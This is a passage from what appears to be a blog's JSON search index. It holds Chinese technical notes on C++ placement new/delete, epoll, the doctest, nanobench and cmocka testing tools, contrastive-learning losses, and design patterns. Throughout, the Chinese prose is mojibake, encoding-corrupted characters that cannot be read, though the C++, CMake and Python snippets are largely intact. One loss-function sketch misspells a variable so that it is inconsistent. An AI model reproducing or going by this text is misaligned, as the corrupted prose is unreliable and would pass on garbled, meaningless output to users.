æœŸé—´æœ‰å¼‚å¸¸è¢«æŠ›å‡ºã€‚åè€…çš„é¢å¤–å‚æ•°å¿…é¡»å’Œoperator newä¸€æ ·ã€‚ å½“ä½ å†™ä¸€ä¸ª placement operator newï¼Œä¹Ÿéœ€è¦å†™å¯¹åº”çš„ placement operator deleteã€‚å¦‚æœæ²¡æœ‰ï¼Œä½ çš„ç¨‹åºå¯èƒ½ä¼šå‘ç”Ÿå†…å­˜æ³„æ¼ã€‚ å½“ä½ å£°æ˜ placement new å’Œplacement deleteï¼Œè€ƒè™‘æ˜¯å¦æœ‰å¿…è¦è¦†ç›–å®ƒä»¬çš„æ­£å¸¸ï¼ˆå…¨å±€é»˜è®¤ï¼‰ç‰ˆæœ¬ã€‚ 1234567891011121314151617181920212223242526272829303132333435class StandardNewDelete &#123;public: // ä½¿ç”¨å…¨å±€é»˜è®¤çš„ new/delete static void* operator new(std::size_t size) throw(std::bad_alloc) &#123; return ::operator new(size); &#125; static void operator delete(void* pMem) throw() &#123; ::operator delete(pMem); &#125; // ä½¿ç”¨å…¨å±€é»˜è®¤çš„ placement new/placement delete static void* operator new(std::size_t size, void* ptr) throw() &#123; return ::operator new(size, ptr); &#125; static void operator delete(void* pMem, void* ptr) throw() &#123; ::operator delete(pMem, ptr); &#125; // ä½¿ç”¨å…¨å±€é»˜è®¤çš„ nothrow new/nothrow delete static void* operator new(std::size_t size, const std::nothrow_t&amp; nt) throw() &#123; return ::operator new(size, nt); &#125; static void operator delete(void* pMem, const std::nothrow_t&amp; nt) throw() &#123; ::operator delete(pMem); &#125;&#125;// å¢åŠ è‡ªå®šä¹‰å½¢å¼class Derived: public StandardNewDelete &#123;public: // é˜²æ­¢æ ‡å‡† new/delete è¢«è¦†ç›– using StandardNewDelete::operator new; using StandardNewDelete::operator delete; // è¿½åŠ è‡ªå®šä¹‰ placement new/placement delete static void* operator new(std::size_t size, std::ostream&amp; logStream) throw(std::bad_alloc); static void operator delete(void* pMem, std::ostream&amp; logStream) throw();&#125; ä¹ã€æ‚é¡¹è®¨è®º æ¡æ¬¾53ï¼šä¸è¦è½»å¿½ç¼–è¯‘å™¨çš„è­¦å‘Š ä¸¥è‚ƒå¯¹å¾…ç¼–è¯‘å™¨å‘å‡ºçš„è­¦å‘Šä¿¡æ¯ã€‚åŠªåŠ›åœ¨ç¼–è¯‘å™¨çš„æœ€é«˜è­¦å‘Šçº§åˆ«ä¸‹äº‰å–â€œæ— ä»»ä½•è­¦å‘Šâ€ã€‚ ä¸åŒçš„ç¼–è¯‘å™¨å¤„ç†æ–¹å¼å¹¶ä¸ç›¸åŒã€‚ æ¡æ¬¾54ï¼šè®©è‡ªå·±ç†Ÿæ‚‰æ ‡å‡†ç¨‹åºåº“ C++æ ‡å‡†ç¨‹åºåº“çš„ä¸»è¦åŠŸèƒ½ç”±STLã€iostreamsã€localesç»„æˆã€‚ ç†Ÿæ‚‰æ™ºèƒ½æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆã€hash-basedå®¹å™¨ã€æ­£åˆ™è¡¨è¾¾å¼ï¼ˆregular expressionsï¼‰ç­‰ã€‚ æ¡æ¬¾55ï¼šè®©è‡ªå·±ç†Ÿæ‚‰Boost Boostè‡´åŠ›äºå…è´¹ã€æºç å¼€æ”¾ã€åŒåƒšå¤å®¡çš„C++ç¨‹åºåº“å¼€å‘ã€‚Booståœ¨C++æ ‡å‡†åŒ–è¿‡ç¨‹ä¸­æ‰®æ¼”æ·±å…·å½±å“åŠ›çš„è§’è‰²ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"epollç®€è¿°","slug":"epollç®€è¿°","date":"2022-03-02T16:02:59.000Z","updated":"2024-01-09T05:01:58.427Z","comments":true,"path":"posts/d207ef0b.html","link":"","permalink":"https://racleray.github.io/posts/d207ef0b.html","excerpt":"ä¸€å›¾æµç®€æ˜“epollå®ç°æœºåˆ¶","text":"epollå®ç°æœºåˆ¶ç²—ç³™ç‰ˆæ€»ç»“ã€‚ Level-triggered VS Edge-triggered ä¸¤ç§æ¨¡å¼åœ¨å®ç°ä¸­çš„ä¸åŒä¹‹å¤„åœ¨äºï¼š åœ¨ ep_send_events_proc å‡½æ•°ï¼ˆep_send_eventsä¸­çš„ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼‰çš„ä¸­ï¼Œå¦‚æœæ˜¯ level-triggered æ¨¡å¼ï¼Œå½“å‰çš„ epoll_item å¯¹è±¡è¢«é‡æ–°åŠ åˆ° eventpoll çš„å°±ç»ªåˆ—è¡¨ ready list ä¸­ï¼Œè¿™æ ·åœ¨ä¸‹ä¸€æ¬¡ epoll_wait è°ƒç”¨æ—¶ï¼Œè¿™äº› epoll_item å¯¹è±¡å°±ä¼šè¢«é‡æ–°å¤„ç†ã€‚è€Œ edge-triggered æ¨¡å¼ï¼Œä¸ä¼šé‡æ–°åŠ å…¥ã€‚ å¦å¤–ï¼Œå¼•ç”¨ä¸€ç¯‡ä¼˜è´¨blog selectã€pollã€epoll - IOæ¨¡å‹è¶…è¯¦è§£ã€‚åŸºç¡€æ¦‚å¿µå’ŒåŸºç¡€ä½¿ç”¨ç­‰çš„ä¿¡æ¯ï¼Œç›´æ¥æœç´¢ï¼Œä¸å†é‡å¤å†™è¿™é‡Œäº†ã€‚ åœ¨ä¸Šé¢å¼•ç”¨çš„blogä¸­ï¼Œæœ‰ä¸€å¼ å…³äº epoll æœºåˆ¶æ›´æŠ½è±¡ä¸€ç‚¹çš„å›¾ï¼Œæ”¾ä¸€èµ·æ–¹ä¾¿å¯¹æ¯”ã€‚ä½†æ˜¯è¯¥ä½œè€…æœ‰ä¸€å¤„é”™è¯¯ï¼Œå…³äºmmapè¯´æ˜ã€‚ è¿™é‡Œå¯¹ mmap å¾—è¯´æ˜æ˜¯é”™è¯¯çš„ã€‚å¹¶ä¸æ˜¯åªæœ‰å—è®¾å¤‡æ‰å¯ä»¥è¿›è¡Œ mmap å†…å­˜æ˜ å°„ã€‚ æ‰€ä»¥ä¸Šå›¾ä¸­çš„è§£é‡Šæ˜¯é”™è¯¯çš„ã€‚æŒ‰æˆ‘çš„è®¤çŸ¥æ¥è®²ï¼Œè¿™é‡Œæ²¡æœ‰å°†äº‹ä»¶é“¾è¡¨è¿›è¡Œå†…å­˜æ˜ å°„ï¼Œè‡³å°‘ä¸æ˜¯è®¾å¤‡ç±»å‹çš„åŸå› ã€‚ rdlist é“¾è¡¨ä¸­çš„äº‹ä»¶æ˜¯ä¼šè¢«å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´çš„ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Computer Network","slug":"Notes/Computer-Network","permalink":"https://racleray.github.io/categories/Notes/Computer-Network/"}],"tags":[{"name":"epoll","slug":"epoll","permalink":"https://racleray.github.io/tags/epoll/"}],"author":"HeRui"},{"title":"C/C++æµ‹è¯•æ¡†æ¶","slug":"C-Cppæµ‹è¯•æ¡†æ¶","date":"2022-01-23T12:59:29.000Z","updated":"2023-09-23T13:57:26.173Z","comments":true,"path":"posts/aeaec6fb.html","link":"","permalink":"https://racleray.github.io/posts/aeaec6fb.html","excerpt":"æµ‹è¯•æ¡†æ¶ï¼šcatch2ã€doctesã€googletestã€cmocka","text":"æ¡†æ¶ Head only catch2 doctest Compile googletest C æµ‹è¯•æ¡†æ¶ï¼š cmocka doctest è½»é‡ ç¼–è¯‘é€Ÿåº¦å¿«ï¼ˆç›¸æ¯”äº catch2ï¼‰ APIå‹å¥½ åŠŸèƒ½ä¸°å¯Œï¼Œæ”¯æŒå¯¹æ¨¡æ¿æ‰¹é‡æµ‹è¯• ä½¿ç”¨ CMake é…ç½®æ—¶ï¼Œç¡®ä¿ç¼–è¯‘çš„ç›®æ ‡æ–‡ä»¶æ‰¾å¾—åˆ° doctest çš„å¤´æ–‡ä»¶å³å¯ã€‚ 1234include_directories('path to doctest.h')# æˆ–è€…target_include_directories($&#123;target_name&#125; PUBLIC 'path to doctest.h') æ–­è¨€å®ç­‰çº§åˆ’åˆ†ï¼š REQUIREï¼šè¿™ä¸ªç­‰çº§ç®—æ˜¯æœ€é«˜çš„ï¼Œå¦‚æœæ–­è¨€å¤±è´¥ï¼Œä¸ä»…ä¼šæ ‡è®°ä¸ºæµ‹è¯•ä¸é€šè¿‡ï¼Œè€Œä¸”ä¼šå¼ºåˆ¶é€€å‡ºæµ‹è¯•ã€‚ CHECKï¼šå¦‚æœæ–­è¨€å¤±è´¥ï¼Œæ ‡è®°ä¸ºæµ‹è¯•ä¸é€šè¿‡ï¼Œä½†ä¸ä¼šå¼ºåˆ¶é€€å‡ºï¼Œä¼šç»§ç»­æ‰§è¡Œã€‚ WARNï¼šå¦‚æœæ–­è¨€å¤±è´¥ï¼Œä¸ä¼šæ ‡è®°ä¸ºæµ‹è¯•ä¸é€šè¿‡ï¼Œä¹Ÿä¸ä¼šå¼ºåˆ¶é€€å‡ºï¼Œä½†æ˜¯ä¼šç»™å‡ºå¯¹åº”çš„æç¤ºã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// build test subcases like a tree.// run: 1--2--end 1--3--end two subroutines.TEST_CASE(\"vectors can be sized and resized\") &#123; std::vector&lt;int&gt; v(5); // 1 REQUIRE(v.size() == 5); REQUIRE(v.capacity() &gt;= 5); SUBCASE(\"adding to the vector increases it's size\") &#123; // 2 v.push_back(1); CHECK(v.size() == 6); CHECK(v.capacity() &gt;= 6); &#125; SUBCASE(\"reserving increases just the capacity\") &#123; // 3 v.reserve(6); CHECK(v.size() == 5); CHECK(v.capacity() &gt;= 6); &#125;&#125;// Group the test cases.TEST_SUITE(\"math\") &#123; TEST_CASE(\"\") &#123;&#125; // part of the math test suite TEST_CASE(\"\") &#123;&#125; // part of the math test suite&#125;// Test template.TEST_CASE_TEMPLATE(\"test std::any as integer\", T, char, short, int, long long int) &#123; auto v = T(); std::any var = T(); CHECK(std::any_cast&lt;T&gt;(var) == v);&#125;TEST_CASE_TEMPLATE(\"test std::any as string\", T, const char *, std::string_view, std::string) &#123; T v = \"hello world\"; std::any var = v; CHECK(std::any_cast&lt;T&gt;(var) == v);&#125;TEST_CASE(\"infos\") &#123; REQUIRE(\"foobar\" == doctest::Contains(\"foo\")); CHECK_MESSAGE(2 == 1, \"not valid\"); REQUIRE(22.0 / 7 == doctest::Approx(3.141).epsilon(0.01)); // allow for a 1% error&#125; nanobench nanobench 12345678910111213141516include(FetchContent)FetchContent_Declare( nanobench GIT_REPOSITORY https://github.com/martinus/nanobench.git GIT_TAG v4.1.0 GIT_SHALLOW TRUE)FetchContent_MakeAvailable(nanobench)...# ç›®æ ‡æ–‡ä»¶é“¾æ¥target_link_libraries($&#123;target_name&#125; PRIVATE nanobench) 12345678910#include &lt;nanobench.h&gt;#include &lt;atomic&gt;int main() &#123; int y = 0; std::atomic&lt;int&gt; x(0); ankerl::nanobench::Bench().run(\"compare_exchange_strong\", [&amp;] &#123; x.compare_exchange_strong(y, 0); &#125;);&#125; è¾“å‡ºç»“æœ ns/op op/s err% total benchmark 9.07 110,254,890.34 0.0% 0.00 compare_exchange_strong ns/opï¼šæ¯ä¸ªbenchå†…å®¹éœ€è¦ç»å†çš„æ—¶é—´ï¼ˆnsä¸ºå•ä½ï¼‰ op/sï¼šæ¯ç§’å¯ä»¥æ‰§è¡Œå¤šå°‘æ¬¡æ“ä½œ err%ï¼šè¿è¡Œå¤šæ¬¡æµ‹è¯•çš„æ³¢åŠ¨æƒ…å†µï¼ˆè¯¯å·®ï¼‰ ins/opï¼šæ¯æ¬¡æ“ä½œéœ€è¦å¤šå°‘æ¡æŒ‡ä»¤ cyc/opï¼šæ¯æ¬¡æ“ä½œéœ€è¦å¤šå°‘æ¬¡æ—¶é’Ÿå‘¨æœŸ bra/opï¼šæ¯æ¬¡æ“ä½œæœ‰å¤šå°‘æ¬¡åˆ†æ”¯é¢„åˆ¤ miss%ï¼šåˆ†æ”¯é¢„åˆ¤çš„missç‡ totalï¼šæœ¬æ¬¡æ¶ˆè€—çš„æ€»æ—¶é—´ benchmarkï¼š\"compare_exchange_strong\" è‡ªå®šä¹‰æµ‹è¯•åç§° å¯æµ‹ BigO æ—¶é—´å¤æ‚åº¦ï¼š 123456789101112131415161718192021222324252627282930313233343536#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN#include &lt;doctest.h&gt;#include &lt;nanobench.h&gt;#include &lt;iostream&gt;#include &lt;atomic&gt;#include &lt;set&gt;TEST_CASE(\"tutorial_complexity_set_find\") &#123; // Create a single benchmark instance that is used in multiple benchmark // runs, with different settings for complexityN. ankerl::nanobench::Bench bench; // a RNG to generate input data ankerl::nanobench::Rng rng; std::set&lt;uint64_t&gt; set; // Running the benchmark multiple times, with different number of elements for (auto setSize : &#123;10U, 20U, 50U, 100U, 200U, 500U, 1000U, 2000U, 5000U, 10000U&#125;) &#123; // fill up the set with random data while (set.size() &lt; setSize) &#123; set.insert(rng()); &#125; // Run the benchmark, provide setSize as the scaling variable. bench.complexityN(set.size()).run(\"std::set find\", [&amp;] &#123; ankerl::nanobench::doNotOptimizeAway(set.find(rng())); &#125;); &#125; // calculate BigO complexy best fit and print the results std::cout &lt;&lt; bench.complexityBigO() &lt;&lt; std::endl;&#125; å¯ä½¿ç”¨ pyperf è§£æç»“æœï¼š 12345678910111213141516171819202122232425262728#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN#include &lt;doctest.h&gt;#include &lt;nanobench.h&gt;#include &lt;algorithm&gt;#include &lt;fstream&gt;#include &lt;atomic&gt;#include &lt;random&gt;TEST_CASE(\"shuffle_pyperf\") &#123; std::vector&lt;uint64_t&gt; data(500, 0); // input data for shuffling // NOLINTNEXTLINE(cert-msc32-c,cert-msc51-cpp) std::default_random_engine defaultRng(123); std::ofstream fout1(\"pyperf_shuffle_std.json\"); ankerl::nanobench::Bench() .epochs(100) .run(\"std::shuffle with std::default_random_engine\", [&amp;]() &#123; std::shuffle(data.begin(), data.end(), defaultRng); &#125;) .render(ankerl::nanobench::templates::pyperf(), fout1); std::ofstream fout2(\"pyperf_shuffle_nanobench.json\"); ankerl::nanobench::Rng rng(123); ankerl::nanobench::Bench() .epochs(100) .run(\"ankerl::nanobench::Rng::shuffle\", [&amp;]() &#123; rng.shuffle(data); &#125;) .render(ankerl::nanobench::templates::pyperf(), fout2);&#125; 1python3 -m pyperf stats pyperf_shuffle_std.json cmocka APIæ–‡æ¡£ã€‚ä½†æ˜¯å»ºè®®ç»“åˆ source code ä¸­çš„ç¤ºä¾‹ç¨‹åºï¼Œäº†è§£ cmocka çš„ä½¿ç”¨ã€‚ é¡¹ç›®ä¸‹æ–°å»ºæ–‡ä»¶å¤¹ cmocka ï¼Œæ·»åŠ ä»¥ä¸‹ .cmake æ–‡ä»¶ï¼š 12345678910111213141516include(FetchContent)FetchContent_Declare( cmocka GIT_REPOSITORY https://git.cryptomilk.org/projects/cmocka.git GIT_TAG cmocka-1.1.7 GIT_SHALLOW 1)set(WITH_STATIC_LIB ON CACHE BOOL \"CMocka: Build with a static library\" FORCE)set(WITH_CMOCKERY_SUPPORT OFF CACHE BOOL \"CMocka: Install a cmockery header\" FORCE)set(WITH_EXAMPLES OFF CACHE BOOL \"CMocka: Build examples\" FORCE)set(UNIT_TESTING ON CACHE BOOL \"CMocka: Build with unit testing\" FORCE)set(PICKY_DEVELOPER OFF CACHE BOOL \"CMocka: Build with picky developer flags\" FORCE)FetchContent_MakeAvailable(cmocka) é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ CMakeLists.txt ä¸­ï¼š 123456789include(cmake/FetchCMocka.cmake)# æ·»åŠ ç¼–è¯‘ç›®æ ‡add_executable(CMockaExample test.c)target_compile_features(CMockaExample PRIVATE c_std_99)target_link_libraries(CMockaExample PRIVATE cmocka-static)enable_testing()add_test(NAME CMockaExample COMMAND CMockaExample) 12345678910111213141516171819#include &lt;stdarg.h&gt;#include &lt;setjmp.h&gt;#include &lt;stddef.h&gt;#include &lt;cmocka.h&gt;static void test(void **state)&#123; assert_int_equal(2, 2);&#125;int main()&#123; const struct CMUnitTest tests[] = &#123; cmocka_unit_test(test), &#125;; return cmocka_run_group_tests(tests, NULL, NULL);&#125;","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"C","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"æµ‹è¯•æ¡†æ¶","slug":"æµ‹è¯•æ¡†æ¶","permalink":"https://racleray.github.io/tags/%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"}],"author":"HeRui"},{"title":"å¯¹æ¯”å­¦ä¹ æŸå¤±ä½¿ç”¨","slug":"å¯¹æ¯”å­¦ä¹ æŸå¤±ä½¿ç”¨","date":"2021-11-03T14:52:53.000Z","updated":"2023-08-07T12:02:23.619Z","comments":true,"path":"posts/39bd8d48.html","link":"","permalink":"https://racleray.github.io/posts/39bd8d48.html","excerpt":"ç®€å•è®°å½•ä¸¤ç§å¯¹æ¯”å­¦ä¹ æŸå¤±çš„ç®€å•ä½¿ç”¨ï¼Œä»¥åŠè®¡ç®—æ–¹æ³•ã€‚","text":"å¯¹äºè‡ªç›‘ç£å­¦ä¹ ï¼Œä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ã€‚ä¸€ç§æ˜¯AutoEncoderè¿™ç§é€šè¿‡ä¸€ä¸ªè¡¨å¾å‘é‡ï¼Œä»è‡ªå·±åˆ°è‡ªå·±çš„è¿˜åŸè¿‡ç¨‹ï¼Œè¿™ç±»ç§°ä¸ºç”Ÿæˆå¼è‡ªç›‘ç£å­¦ä¹ ã€‚ä¸€ç§æ˜¯ä»¥å­¦ä¹ åŒºåˆ†ä¸¤ç§ä¸åŒç±»äº‹ç‰©çš„å…³é”®ç‰¹å¾ä¸ºç›®æ ‡ï¼Œé€šè¿‡æ„å»ºæ­£è´Ÿä¾‹å­ï¼Œå­¦ä¹ è¡¨å¾å‘é‡çš„æ–¹æ³•ï¼Œè¿™ç±»ç§°ä¸ºåˆ¤åˆ«å¼è‡ªç›‘ç£å­¦ä¹ ï¼Œä¹Ÿå«åšå¯¹æ¯”å­¦ä¹ ã€‚ å¯¹æ¯”å­¦ä¹ çš„é€šè¿‡äº’ä¿¡æ¯ï¼Œè¡¡é‡ä¸€ä¸ªè¡¨å¾çš„å¥½åï¼Œä¸æ­£ä¾‹ç›¸ä¼¼è€Œè¿œç¦»è´Ÿä¾‹ã€‚è¿™é‡Œè®°å½•ä¸¤ä¸ªå¸¸ç”¨çš„å¯¹æ¯”å­¦ä¹ æŸå¤±ã€‚ NTXentLoss NTXentLossä¹Ÿå°±æ˜¯InfoNCEä½¿ç”¨çš„æŸå¤±ï¼š \\[ L = -log \\frac{exp(q \\cdot k_+ / \\tau)}{\\sum^{K}_{i=0}exp(q \\cdot k_i / \\tau)} \\] åˆ†å­åœ¨æœ€å°åŒ–æŸå¤±å‡½æ•°æ—¶ï¼Œä¼šä½¿è¡¨å¾ \\(q\\) ä¸æ­£ä¾‹ \\(k_+\\) çš„ç›¸ä¼¼åº¦å¢åŠ ã€‚ å¯ä»¥ç›´æ¥ä½¿ç”¨ PyTorch Metric Learning åŒ…è°ƒç”¨æŸå¤±å‡½æ•°ç±»ã€‚ 12345from pytorch_metric_learning.losses import NTXentLoss...loss_func = NTXentLoss(temperature=temperature)... å…¶åŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š 123456789for anchor, positive in pos_pairs: numerator = torch.exp(torch.matmul(anchor, positive) / (temperature * torch.norm(anchor) * torch.norm(positive))) denominator = numerator.clone() for (candidate, negetive) in neg_pairs: tmp = torch.exp(torch.matmul(anchor, negative) / (temperature * torch.norm(anchor) * torch.norm(negative))) denominator += tmp total_loss += -torch.log(numerator / denominator) SupConLoss SupConLossï¼ˆSupervised Contrastiveï¼‰æ˜¯åœ¨ç›‘ç£æ•°æ®ä¸­ä½¿ç”¨å¯¹æ¯”å­¦ä¹ çš„æŸå¤±å‡½æ•°ã€‚ç”±äºæœ‰ç›‘ç£æ•°æ®çš„æ”¯æ’‘ï¼Œæ­£ä¾‹ä¸å†æ¥æºäºæ ·æœ¬è‡ªèº«ï¼Œè€Œä¸”å¯ä»¥æ¥è‡ªç›‘ç£æ ‡ç­¾ä¸­å±äºåŒä¸€ç±»çš„æ ·æœ¬ã€‚å…¶è®¡ç®—å…¬å¼çš„åŒºåˆ«ä¹Ÿåœ¨äºå¤šäº†ç›‘ç£æ ‡ç­¾çš„éƒ¨åˆ†ã€‚ \\[ L^{sup}= \\sum_{i \\in I} \\frac{-1}{|P(i)|} \\sum_{p \\in P(i)} log \\frac{exp(z_p \\cdot z_i / \\tau)}{ \\sum_{a \\in A(i)} exp(z_a \\cdot z_i / \\tau)} \\] å¯¹æ¯ä¸ªæ­£ä¾‹é™¤ä»¥åŒ…å«è¯¥æ­£ä¾‹çš„positive pairsçš„æ•°é‡ã€‚å…·ä½“çœ‹ä»£ç æ¯”è¾ƒç›´æ¥ã€‚è¿™ä¸ªå…¬å¼æœ‰ä¸¤ç§å½¢å¼ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯å°†å¯¹ \\(|P(i)|\\) æ±‚å¹³å‡çš„æ“ä½œæ”¾ç½®äº log ä¹‹å†…ã€‚ å¯ä»¥ç›´æ¥ä½¿ç”¨ PyTorch Metric Learning åŒ…è°ƒç”¨æŸå¤±å‡½æ•°ç±»ã€‚ 123from pytorch_metric_learning.losses import SupConLossloss_func = SupConLoss(temperature=temperature) å…¶åŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼š 1234567891011121314losses = torch.zeros(num_of_classes, dtype=torch.float64)for anchor, positive in pos_pairs: numerator = torch.exp(torch.matmul(anchor, positive) / (temperature * torch.norm(anchor) * torch.norm(positive))) denominator = numerator.clone() for (candidate, negetive) in neg_pairs: tmp = torch.exp(torch.matmul(anchor, negative) / (temperature * torch.norm(anchor) * torch.norm(negative))) denominator += tmp losses[anchor_idx] += -torch.log(numerator / denominator)total_loss = torch.mean(losses / num_of_positive_pairs_per_anchor) Gatheræ“ä½œ å’Œä¹‹å‰ä¸»é¢˜æ— å…³ï¼Œåªæ˜¯è®°åœ¨ä¸€èµ·ã€‚ 1output = tensor.gather(dim, index) tensorä¸indexæ˜¯ä¸¤ä¸ªç»´åº¦ç›¸åŒçš„å¼ é‡ã€‚ outputä¸­çš„ä¸‹æ ‡ä¸º (i, j) çš„å€¼æ¥è‡ªï¼š dim = 0ï¼Œä»tensorä¸­å–å€¼æ—¶ï¼Œ0ç»´çš„åæ ‡å€¼æ¥è‡ªindexå¼ é‡çš„ (i, j) ä½ç½®çš„å€¼ï¼Œ1ç»´çš„åæ ‡å€¼å°±æ˜¯ j ï¼ˆoutputä¸­æœ¬æ¥çš„åæ ‡å€¼ï¼‰ã€‚ dim = 1ï¼Œä»tensorä¸­å–å€¼æ—¶ï¼Œ1ç»´çš„åæ ‡å€¼æ¥è‡ªindexå¼ é‡çš„ (i, j) ä½ç½®çš„å€¼ï¼Œ0ç»´çš„åæ ‡å€¼å°±æ˜¯ i ï¼ˆoutputä¸­æœ¬æ¥çš„åæ ‡å€¼ï¼‰ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"contrastive learning","slug":"contrastive-learning","permalink":"https://racleray.github.io/tags/contrastive-learning/"}],"author":"HeRui"},{"title":"è®¾è®¡æ¨¡å¼Notes","slug":"è®¾è®¡æ¨¡å¼Notes","date":"2021-10-25T12:14:37.000Z","updated":"2023-08-07T11:54:31.049Z","comments":true,"path":"posts/97f88c07.html","link":"","permalink":"https://racleray.github.io/posts/97f88c07.html","excerpt":"GOFä¸­23ä¸­è®¾è®¡æ¨¡å¼æ•´ç†ã€‚","text":"è®¡ç®—æœºç§‘å­¦ä¸­æœ‰ä¸¤ç§æ€è€ƒæ–¹å¼ï¼š åº•å±‚æ€ç»´ï¼šå‘ä¸‹ï¼ŒæŠŠæ¡æœºå™¨åº•å±‚ä»å¾®è§‚ç†è§£å¯¹è±¡æ„é€ ã€‚ æŠ½è±¡æ€ç»´ï¼šå‘ä¸Šï¼Œå°†é—®é¢˜å¤„ç†è¿‡ç¨‹æŠ½è±¡ä¸ºç¨‹åºä»£ç ã€‚ è®¾è®¡æ¨¡å¼é€šè¿‡æŠ½è±¡ï¼Œåˆ†ç¦»èŒè´£ï¼Œæé«˜å¤ç”¨æ€§ã€‚ ç¬¬ä¸€ä¸ªç¤ºä¾‹ ç»˜åˆ¶ç‚¹æˆ–è€…çº¿ï¼Œå®ç°æ–¹å¼ä¸€ï¼Œç‚¹æ˜¯ç‚¹ï¼Œçº¿æ˜¯çº¿ã€‚ 123456789101112131415161718192021222324252627class Point &#123;...&#125;;class Line &#123;...&#125;;class MainForm : public Form &#123; ...;private: vector&lt;Line&gt; lineVector; vector&lt;Rect&gt; rectVector;protected: ... virtual void OnMouseUp(const MouseEventArgs&amp; e); virtual void OnPaint(const PaintEventArgs&amp; e);&#125;;void MainForm::OnMouseUp(const MouseEventArgs&amp; e)&#123; // Pointå¤„ç†ä»£ç  ...; // Lineå¤„ç†ä»£ç  ...;&#125;void MainForm::OnPaint(const PaintEventArgs&amp; e)&#123; // Pointå¤„ç†ä»£ç  ...; // Lineå¤„ç†ä»£ç  ...;&#125; æ–¹å¼äºŒï¼ŒæŠ½è±¡å‡ºShapeåŸºç±»ï¼Œåœ¨MainFormä¸­ç»Ÿä¸€æ¥å£è°ƒç”¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Shape&#123;public: virtual void Draw(const Graphics&amp; g)=0; virtual ~Shape() &#123; &#125;&#125;;class Point: public Shape&#123; // ç”»ç‚¹ virtual void Draw(const Graphics&amp; g)&#123; ... &#125;;&#125;;class Line: public Shape&#123; // ç”»çº¿ virtual void Draw(const Graphics&amp; g)&#123; ... &#125;;&#125;;class MainForm : public Form &#123; ...;private: // æŠ½è±¡ vector&lt;Shape *&gt; shapes;protected: ... virtual void OnMouseUp(const MouseEventArgs&amp; e); virtual void OnPaint(const PaintEventArgs&amp; e);&#125;;void MainForm::OnMouseUp(const MouseEventArgs&amp; e)&#123; // Shapeå¤„ç†ä»£ç  ...;&#125;void MainForm::OnPaint(const PaintEventArgs&amp; e)&#123; // Shapeå¤„ç†ä»£ç  ...; for (int i = 0; i &lt; shapes.size(); i++)&#123; shapes[i]-&gt;Draw(e.Graphics); //å¤šæ€è°ƒç”¨ &#125;&#125; æ¦‚å¿µ è®¾è®¡æ¨¡å¼è¦è§£å†³çš„èƒ½è§£å†³çš„é—®é¢˜ï¼Œæ˜¯ç¨‹åºåŒæ—¶æœ‰â€œç¨³å®šä¸å˜çš„éƒ¨åˆ†â€å’Œâ€œå¯èƒ½å‘ç”Ÿå˜åŒ–çš„éƒ¨åˆ†â€æ—¶ï¼Œå¦‚ä½•æé«˜ä»£ç é‡ç”¨æ€§ã€‚ç›®æ ‡æ˜¯å°†å˜åŒ–çš„éƒ¨åˆ†è§„çº¦åˆ°ä¸€èµ·ï¼Œå¹¶ä½¿æ‰©å±•åŠŸèƒ½å˜å¾—å®¹æ˜“ä¸€äº›ã€‚å¦‚æœåªæœ‰ç¨³å®šçš„éƒ¨åˆ†ï¼Œä¸éœ€è¦è®¾è®¡æ¨¡å¼ã€‚å¦‚æœå…¨æ˜¯å˜åŒ–çš„éƒ¨åˆ†ï¼Œä½¿ç”¨è®¾è®¡æ¨¡å¼å¹¶ä¸èƒ½åˆ°è¾¾ç›®çš„ã€‚ é¢å‘å¯¹è±¡çš„ç†è§£ éš”ç¦»å˜åŒ– ä»å®è§‚å±‚é¢æ¥çœ‹ï¼Œé¢å‘å¯¹è±¡çš„æ„å»ºæ–¹å¼æ›´èƒ½é€‚åº”è½¯ä»¶çš„å˜åŒ–ï¼Œèƒ½å°†å˜åŒ–æ‰€å¸¦æ¥çš„å½±å“å‡ä¸ºæœ€å° å„å¸å…¶èŒ ä»å¾®è§‚å±‚é¢æ¥çœ‹ï¼Œé¢å‘å¯¹è±¡çš„æ–¹å¼æ›´å¼ºè°ƒå„ä¸ªç±»çš„â€œè´£ä»»â€ ç”±äºéœ€æ±‚å˜åŒ–å¯¼è‡´çš„æ–°å¢ç±»å‹ä¸åº”è¯¥å½±å“åŸæ¥ç±»å‹çš„å®ç°â€”â€”æ˜¯æ‰€è°“å„è´Ÿå…¶è´£ å¯¹è±¡æ˜¯ä»€ä¹ˆ ä»è¯­è¨€å®ç°å±‚é¢æ¥çœ‹ï¼Œå¯¹è±¡å°è£…äº†ä»£ç å’Œæ•°æ®ã€‚ ä»è§„æ ¼å±‚é¢è®²ï¼Œå¯¹è±¡æ˜¯ä¸€ç³»åˆ—å¯è¢«ä½¿ç”¨çš„å…¬å…±æ¥å£ã€‚ 